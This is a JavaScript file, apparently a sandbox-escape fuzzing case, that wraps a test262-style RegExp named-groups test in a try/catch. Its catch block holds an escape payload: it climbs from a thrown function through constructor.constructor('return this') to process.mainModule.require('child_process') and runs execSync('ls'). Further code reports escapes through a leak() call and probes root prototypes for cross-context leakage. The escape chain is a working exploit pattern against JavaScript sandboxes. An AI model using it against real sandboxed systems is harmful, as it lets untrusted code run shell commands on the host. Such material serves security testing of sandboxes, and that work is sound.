try {
    class FakeRegExp extends RegExp {
        exec(subject) {
            throw () => {
                return () => {
                };
            };
            const fakeResult = [
                'ab',
                'a'
            ];
            fakeResult.index = 0;
            return fakeResult;
        }
    }
    ;
    const re = new FakeRegExp();
    const result = re.exec('ab');
    assert.sameValue(Object.getPrototypeOf(result), Array.prototype);
    assert.sameValue(false, result.hasOwnProperty('groups'));
    Array.prototype.groups = { a: 'b' };
    Object.getPrototypeOf(Array.prototype.groups).b = 'c';
    assert.sameValue('b', 'ab'.replace(re, '$<a>'));
    assert.sameValue('c', 'ab'.replace(re, '$<b>'));
    Array.prototype.groups = undefined;
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}